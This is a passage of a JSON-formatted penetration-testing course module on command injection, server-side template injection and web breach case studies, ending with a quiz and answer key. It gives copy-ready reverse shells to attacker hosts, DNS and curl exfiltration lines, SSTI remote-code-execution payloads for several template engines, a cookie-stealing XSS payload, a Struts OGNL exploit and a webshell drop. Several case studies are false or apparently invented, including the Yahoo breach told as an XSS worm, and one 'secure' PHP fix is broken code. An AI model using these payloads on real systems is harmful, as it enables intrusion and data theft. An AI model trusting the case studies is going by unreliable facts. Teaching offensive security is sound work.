Bad (blacklist - easily bypassed)\nif (strpos($input, ';') !== false || strpos($input, '|') !== false) {\ndie('Invalid input');\n}\n\n// Good (whitelist - only allow expected format)\nif (!preg_match('/^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$/', $ip)) {\ndie('Invalid IP address');\n}\n```\n\n**2. Use language-specific functions instead of shell:**\n```php\n// Bad (using shell)\n$output = shell_exec(\"ping -c 4 \" . $ip);\n\n// Good (using exec with argument array)\n$output = exec(\"ping\", [\"-c\", \"4\", escapeshellarg($ip)]);\n```\n\n**3. Escape shell arguments:**\n```php\n// Escape special characters\n$safe_ip = escapeshellarg($ip);\n$output = shell_exec(\"ping -c 4 \" . $safe_ip);\n```"
      }
    },
    {
      "block_id": "b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d75",
      "type": "memory_aid",
      "content": {
        "text": "**Memory Aid: Command Injection - \"SOAP\" Framework**\n\n**S**eparators - `;`, `&&`, `||`, `|`, `&`, newline\n**O**perators - Command substitution: `` `cmd` ``, `$(cmd)`\n**A**lternatives - Bypass filters: wildcards, concatenation, encoding\n**P**ayloads - Reverse shells, data exfil, blind detection\n\n**Quick test payload:**\n```\n; whoami\n&& whoami\n| whoami\n`whoami`\n$(whoami)\n```\nOne of these usually works if command injection exists.\n\n**Blind detection:**\n```\n; sleep 10\n; nslookup $(whoami).attacker.com\n; curl attacker.com/$(id)\n```\n\n**Bypass filters - \"WAVE\" method:**\n\n**W**ildcards: `c?t`, `/b??/c?t`\n**A**lternatives: `ca''t`, `ca\"\"t`\n**V**ariables: `$IFS`, `${PATH:0:1}`\n**E**ncoding: base64, hex, octal\n\n**Remember:** \"If one separator blocked, try another. If command blocked, use wildcard!\"\n\n**Most reliable reverse shell (copy-paste ready):**\n```bash\nbash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n```"
      }
    },
    {
      "block_id": "b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d76",
      "type": "explanation",
      "content": {
        "text": "## Server-Side Template Injection (SSTI)\n\nTemplate engines (Jinja2, Twig, Freemarker, Velocity) dynamically generate HTML. When user input is embedded in templates unsafely, SSTI can lead to RCE.\n\n### **Vulnerable Code Example (Python Flask with Jinja2)**\n\n```python\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/hello')\ndef hello():\nname = request.args.get('name')\n# VULNERABLE: Directly embedding user input in template\ntemplate = '<h1>Hello ' + name + '!</h1>'\nreturn render_template_string(template)\n```\n\n**Normal usage:**\n```\nhttp://target.com/hello?name=Alice\nOutput: <h1>Hello Alice!</h1>\n```\n\n**SSTI exploitation:**\n```\nhttp://target.com/hello?name={{7*7}}\nOutput: <h1>Hello 49!</h1>\n# Template engine evaluated 7*7 = 49\n```\n\n### **SSTI Detection**\n\n**Test payloads:**\n```\n{{7*7}}          # Jinja2, Twig - Should return 49\n${7*7}           # Freemarker, Velocity - Should return 49\n<%= 7*7 %>       # ERB (Ruby) - Should return 49\n${{7*7}}         # Unknown template engine\n#{7*7}           # Thymeleaf (Java)\n```\n\n**If one works, you've confirmed SSTI!**\n\n### **Jinja2 SSTI Exploitation (Python Flask/Django)**\n\n**1. Basic exploitation (read Python objects):**\n```python\n# List all available classes\n{{ ''.__class__.__mro__[1].__subclasses__() }}\n\n# Output: [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, ...]\n```\n\n**2. Finding useful classes for RCE:**\n```python\n# Search for subprocess.Popen class (index varies by Python version)\n{{ ''.__class__.__mro__[1].__subclasses__()[400] }}\n# Look for: <class 'subprocess.Popen'>\n\n# Alternative: Search for os._wrap_close\n{{ ''.__class__.__mro__[1].__subclasses__()[137] }}\n```\n\n**3. Remote Code Execution:**\n```python\n# Execute whoami command\n{{ ''.__class__.__mro__[1].__subclasses__()[400]('whoami', shell=True, stdout=-1).communicate()[0].strip() }}\n\n# Read /etc/passwd\n{{ ''.__class__.__mro__[1].__subclasses__()[400]('cat /etc/passwd', shell=True, stdout=-1).communicate()[0] }}\n\n# Reverse shell\n{{ ''.__class__.__mro__[1].__subclasses__()[400]('bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"', shell=True, stdout=-1).communicate() }}\n```\n\n**4. Alternative RCE method (using __import__):**\n```python\n# Import os module and execute command\n{{ ''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}\n\n# Shorter version (if config available)\n{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}\n```\n\n### **Twig SSTI Exploitation (PHP Symfony)**\n\n**1. Detection:**\n```php\n{{7*7}}  # Returns 49 if vulnerable\n```\n\n**2. Code execution:**\n```php\n# Execute PHP code\n{{ _self.env.registerUndefinedFilterCallback('exec') }}\n{{ _self.env.getFilter('whoami') }}\n\n# Alternative method\n{{ ['id'] | map('system') | join }}\n{{ ['cat /etc/passwd'] | filter('system') }}\n```\n\n**3. Read files:**\n```php\n{{ '/etc/passwd' | file_excerpt(1, 100) }}\n```\n\n### **Freemarker SSTI Exploitation (Java)**\n\n**1. Detection:**\n```java\n${7*7}  # Returns 49 if vulnerable\n```\n\n**2. Code execution:**\n```java\n# Execute OS command\n<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"whoami\") }\n\n# Read file\n<#assign classLoader=object?class.classLoader>\n<#assign data=classLoader.loadClass(\"java.lang.System\").getProperty(\"user.dir\")>\n${data}\n```\n\n### **ERB SSTI Exploitation (Ruby on Rails)**\n\n**1. Detection:**\n```ruby\n<%= 7*7 %>  # Returns 49 if vulnerable\n```\n\n**2. Code execution:**\n```ruby\n# Execute system command\n<%= system('whoami') %>\n<%= `whoami` %>\n<%= IO.popen('whoami').readlines() %>\n\n# Reverse shell\n<%= system('bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"') %>\n```\n\n### **Real-World SSTI Case Study: Uber (2016)**\n\n**Vulnerability:** Jinja2 SSTI in Uber's internal admin panel\n\n**Exploitation:**\n```python\n# Payload used by researcher\n{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}\n\n# Result: Full /etc/passwd file leaked\n```\n\n**Impact:** Internal source code disclosure, potential RCE on production servers\n\n**Bounty:** $10,000 reward\n\n### **SSTI Prevention**\n\n**1. Never put user input directly in templates:**\n```python\n# Bad (vulnerable)\ntemplate = '<h1>Hello ' + user_input + '!</h1>'\nreturn render_template_string(template)\n\n# Good (safe)\nreturn render_template('hello.html', name=user_input)\n```\n\n**2. Use sandbox mode (where available):**\n```python\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\n```\n\n**3. Input validation:**\n```python\n# Reject template syntax characters\nif any(char in user_input for char in ['{', '}', '[', ']', '|']):\nreturn \"Invalid input\"\n```"
      }
    },
    {
      "block_id": "b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d77",
      "type": "real_world",
      "content": {
        "text": "## Real-World Advanced Web Attack Case Studies\n\n### **Case Study 1: Capital One Breach via SSRF (2019)**\n\n**Impact:** 100 million customer records stolen, 140,000 Social Security numbers, 80,000 bank account numbers\n\n**Attack vector:** Server-Side Request Forgery (SSRF) against AWS metadata service\n\n**Technical details:**\n```bash\n# Vulnerable web application had SSRF in image processing\nPOST /api/process-image\n{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role\"}\n\n# Returned AWS IAM credentials:\n{\n\"AccessKeyId\": \"ASIA...\",\n\"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG...\",\n\"Token\": \"FQoGZXIvYXdzEB...\"\n}\n\n# Attacker used credentials to access S3 buckets\naws s3 ls s3://capital-one-customer-data --profile stolen\naws s3 sync s3://capital-one-customer-data . --profile stolen\n```\n\n**Lesson learned:**\n- SSRF can access cloud metadata services (AWS, Azure, GCP)\n- Always validate and whitelist allowed URLs in image processing\n- Use IMDSv2 on AWS (requires header authentication)\n- Network segmentation: Application servers shouldn't access metadata directly\n\n### **Case Study 2: Yahoo XSS Worm (2013)**\n\n**Impact:** 3 billion user accounts compromised (largest breach in history)\n\n**Attack vector:** Stored XSS in Yahoo Mail\n\n**Technical details:**\n```javascript\n// Attacker sent email with malicious payload\nSubject: Check this out!\nBody: <img src=x onerror=\"\n// Steal session cookies\nfetch('http://attacker.com/?c=' + document.cookie);\n\n// Forward email to attacker with all contacts\nvar contacts = document.querySelectorAll('.contact-email');\ncontacts.forEach(c => fetch('http://attacker.com/?email=' + c.textContent));\n\n// Self-propagate (worm behavior)\nfetch('/send-email', {\nmethod: 'POST',\nbody: JSON.stringify({\nto: contacts,\nsubject: 'Check this out!',\nbody: this.payload\n})\n});\n\">\n```\n\n**Lesson learned:**\n- Stored XSS can create self-propagating worms\n- Email clients MUST sanitize HTML content strictly\n- Content Security Policy (CSP) prevents inline script execution\n- Rate limiting prevents mass email sending\n\n### **Case Study 3: Equifax Apache Struts RCE (2017)**\n\n**Impact:** 147 million records stolen, $700 million settlement\n\n**Attack vector:** Command injection via Apache Struts CVE-2017-5638 (OGNL injection)\n\n**Technical details:**\n```bash\n# Vulnerable Content-Type header processing\nPOST /dispute.action HTTP/1.1\nHost: equifax.com\nContent-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n\n# Simplified explanation:\n# 1. Exploit OGNL expression evaluation in Content-Type header\n# 2. Disable security manager\n# 3. Execute arbitrary system commands\n# 4. Exfiltrate /etc/passwd and other sensitive files\n```\n\n**Lesson learned:**\n- Patch management is critical (vulnerability known for 2 months before breach)\n- Web Application Firewall (WAF) could have blocked abnormal Content-Type headers\n- Principle of least privilege: Web servers shouldn't access sensitive databases\n\n### **Case Study 4: GitHub Enterprise SSTI → RCE (2020)**\n\n**Impact:** Critical RCE on GitHub Enterprise servers, $10,000 bounty\n\n**Attack vector:** Server-Side Template Injection in error pages\n\n**Technical details:**\n```ruby\n# Vulnerable ERB template in error page\n# app/views/errors/404.html.erb\n<h1>Page not found: <%= params[:path] %></h1>\n\n# Exploitation\nGET /this-page-does-not-exist?path=<%=`whoami`%> HTTP/1.1\nHost: github-enterprise.company.com\n\n# Response:\n<h1>Page not found: git</h1>\n\n# Escalation to reverse shell\nGET /404?path=<%=`bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'`%> HTTP/1.1\n\n# Result: Full shell access to GitHub Enterprise server\n```\n\n**Lesson learned:**\n- Never put user input directly in template expressions\n- Use template sandboxing (Jinja2 SandboxedEnvironment, etc.)\n- Even error pages can be vulnerable - review all code paths\n\n### **Case Study 5: Drupal Drupalgeddon2 RCE (2018)**\n\n**Impact:** 1+ million websites compromised, used in cryptomining botnet\n\n**Attack vector:** Insecure deserialization + array injection\n\n**Technical details:**\n```php\n# Vulnerable Drupal code (simplified)\n$form = $_POST['form'];\neval($form['#submit'][0]);  // Executes user-controlled callback\n\n# Exploitation\nPOST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\nHost: vulnerable-drupal.com\nContent-Type: application/x-www-form-urlencoded\n\nform[#submit][]=system&form[#submit][]=whoami\n\n# Response: www-data\n\n# Escalation to webshell\nPOST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\n\nform[#submit][]=system&form[#submit][]=echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php\n\n# Access webshell\nGET /shell.php?cmd=whoami HTTP/1.1\n```\n\n**Lesson learned:**\n- Array injection can bypass input validation\n- Never pass user input to eval(), system(), or similar dangerous functions\n- Security updates must be applied immediately for critical CVEs\n- Over 1 million sites were compromised because admins didn't patch quickly\n\n### **Common Patterns Across All Case Studies:**\n\n1. **Input validation failures** - User input passed to dangerous functions unsanitized\n2. **Delayed patching** - Known vulnerabilities exploited months after patches available\n3. **Defense in depth failures** - Single vulnerability led to complete compromise\n4. **Cloud metadata access** - SSRF against AWS/Azure metadata is increasingly common\n5. **Chaining vulnerabilities** - XSS → Cookie theft → Session hijacking → Admin access\n\n**Industry Statistics (2023):**\n- 75% of attacks target web application layer (Verizon DBIR)\n- XSS found in 40% of web applications (Acunetix)\n- Average time to exploit SSTI for RCE: 2-3 hours (Bug bounty data)\n- File upload vulnerabilities in 25% of applications (Portswigger)\n- Command injection 3rd most dangerous vulnerability (OWASP Top 10)"
      }
    },
    {
      "block_id": "b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d78",
      "type": "reflection",
      "content": {
        "text": "## Self-Assessment: Advanced Web Attack Mastery\n\n**1. XSS Proficiency**\n\nRate your confidence (1-5):\n- [ ] Reflected XSS exploitation - _____/5\n- [ ] Stored XSS exploitation - _____/5\n- [ ] DOM-based XSS identification - _____/5\n- [ ] XSS filter bypass techniques - _____/5\n- [ ] CSP bypass methods - _____/5\n\n**Describe a scenario where stored XSS would be more dangerous than reflected XSS:**\n\n**What's your go-to XSS payload when testing? Why?**\n\n**2. File Upload Attacks**\n\nRate your confidence (1-5):\n- [ ] Extension-based filter bypass - _____/5\n- [ ] Magic byte manipulation - _____/5\n- [ ] Creating polyglot files - _____/5\n- [ ] .htaccess exploitation - _____/5\n- [ ] Path traversal in uploads - _____/5\n\n**How would you bypass a file upload filter that checks both extension AND magic bytes?**\n\n**What's the most reliable method you've used to achieve RCE via file upload?**\n\n**3. Command Injection**\n\nRate your confidence (1-5):\n- [ ] Basic command injection - _____/5\n- [ ] Blind command injection detection - _____/5\n- [ ] Filter bypass techniques - _____/5\n- [ ] Reverse shell payloads - _____/5\n- [ ] Out-of-band data exfiltration - _____/5\n\n**If spaces and semicolons are filtered, what's your first bypass attempt?**\n\n**Describe how you would exfiltrate data from a blind command injection vulnerability:**\n\n**4. Server-Side Template Injection**\n\nRate your confidence (1-5):\n- [ ] SSTI detection across different engines - _____/5\n- [ ] Jinja2 exploitation - _____/5\n- [ ] Twig exploitation - _____/5\n- [ ] Template sandbox escapes - _____/5\n\n**How do you differentiate between Jinja2 and Twig SSTI?**\n\n**What payload would you use first to detect SSTI in an unknown template engine?**\n\n**5. Attack Chaining**\n\n**Describe how you would chain multiple vulnerabilities:**\n\n**Scenario 1:** You find reflected XSS and file upload on the same application. How do you escalate?\n\n**Scenario 2:** You discover SSRF and the application runs on AWS. What's your attack path?\n\n**Scenario 3:** You find command injection but have no output. How do you confirm and exploit it?\n\n**6. Real-World Application**\n\n**Which vulnerability from this lesson do you consider most dangerous? Why?**\n\n**If you could only test for ONE vulnerability in a pentest, which would it be?**\n\n**7. Ethical Considerations**\n\n**How do you responsibly test for XSS without affecting other users?**\n\n**What precautions do you take when testing file uploads in production?**\n\n**8. Action Plan**\n\n**Based on this reflection, what are your next steps?**\n\n**Skills to practice:**\n1. \n2. \n3. \n\n**Labs to complete:**\n1. \n2. \n3. \n\n**Vulnerable applications to practice on:**\n- [ ] DVWA (Damn Vulnerable Web Application)\n- [ ] bWAPP (Buggy Web Application)\n- [ ] OWASP WebGoat\n- [ ] PortSwigger Web Security Academy\n- [ ] HackTheBox web challenges\n\n**Remember:** These attacks are powerful and can cause real damage. Always get written authorization before testing, document all findings, and practice responsible disclosure!"
      }
    }
  ],
  "post_assessment": [
    {
      "question": "You discover a reflected XSS vulnerability, but the application blocks <script> tags and alert() function calls. Which payload is most likely to successfully bypass these filters and demonstrate the vulnerability?",
      "options": [
        "<script>confirm(1)</script>",
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script>window['alert'](1)</script>"
      ],
      "correct_answer": 1,
      "explanation": "Option B bypasses both filters: it uses <img> tag instead of <script>, and uses String.fromCharCode() to encode 'alert(1)' (character codes 97,108,101,114,116,40,49,41), avoiding the alert() keyword. Option A still uses blocked alert, option C uses <script> tag (likely blocked regardless of case), and option D uses blocked <script> tag.",
      "question_id": "5624852a-2a71-452a-870e-3cd16d3997fc",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "During a penetration test, you find a file upload feature that validates extensions (blocks .php), checks Content-Type headers (must be image/*), and verifies magic bytes (must be valid JPEG). Which technique would successfully upload a PHP webshell?",
      "options": [
        "Upload shell.php with Content-Type: image/jpeg",
        "Upload shell.jpg containing only PHP code",
        "Upload .htaccess to enable PHP on .jpg, then upload shell.jpg with JPEG magic bytes + PHP code",
        "Upload shell.php.jpg with JPEG magic bytes"
      ],
      "correct_answer": 2,
      "explanation": "Option C is correct: First upload .htaccess with 'AddType application/x-httpd-php .jpg' to make Apache execute .jpg files as PHP, then upload a polyglot file (JPEG magic bytes + PHP code) with .jpg extension. Option A fails extension check (.php blocked), option B won't have JPEG magic bytes (fails validation), option D might upload but won't execute as PHP without .htaccess modification.",
      "question_id": "2ff3b8e6-275d-49ad-9b26-ddf8b1d1d902",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "You discover blind command injection in a parameter, but command output is not displayed and you cannot make outbound connections (firewall blocks HTTP/DNS). How would you confirm the vulnerability?",
      "options": [
        "Use curl to send data to external server",
        "Use time-based detection: inject 'sleep 10' and measure response time",
        "Use nslookup to exfiltrate data via DNS",
        "Inject 'whoami > /var/www/html/output.txt' and check the file"
      ],
      "correct_answer": 1,
      "explanation": "Time-based detection (option B) works when you cannot see output or make outbound connections - if the server delays response by 10 seconds after injecting 'sleep 10', command injection is confirmed. Options A and C require outbound connections (blocked by firewall). Option D requires you to know the web root path and have write permissions, which may not be available.",
      "question_id": "e6cca4dc-b8fa-4b38-b2e9-942df1509058",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "You identify Jinja2 Server-Side Template Injection in a Python Flask application. Which payload would most reliably achieve remote code execution?",
      "options": [
        "{{ 7*7 }}",
        "{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}",
        "{{ system('whoami') }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[400] }}"
      ],
      "correct_answer": 1,
      "explanation": "Option B achieves RCE by accessing the os module through Python's introspection: config object → __init__ method → __globals__ dictionary → os module → popen() for command execution. Option A only confirms SSTI (7*7=49), option C won't work (system isn't directly available in Jinja2), option D only lists a class without executing commands.",
      "question_id": "bc85faa1-3972-4b02-961b-e00bcdf85c0d",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "During the Capital One breach (2019), attackers used SSRF to access AWS metadata and steal credentials. If you discover SSRF in an AWS-hosted application, which URL would most effectively retrieve IAM credentials?",
      "options": [
        "http://169.254.169.254/latest/meta-data/public-ipv4",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://localhost/admin/credentials",
        "http://169.254.169.254/latest/user-data"
      ],
      "correct_answer": 1,
      "explanation": "Option B accesses the IAM role credentials endpoint on AWS metadata service (169.254.169.254), which returns AccessKeyId, SecretAccessKey, and SessionToken. Option A only retrieves public IP (not sensitive), option C is not a standard AWS metadata endpoint, and option D retrieves user-data (startup scripts) which may contain secrets but is less reliable than direct credential access.",
      "question_id": "6bbc5b12-3ab2-495c-acb2-588fb3fbbbcf",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ]
}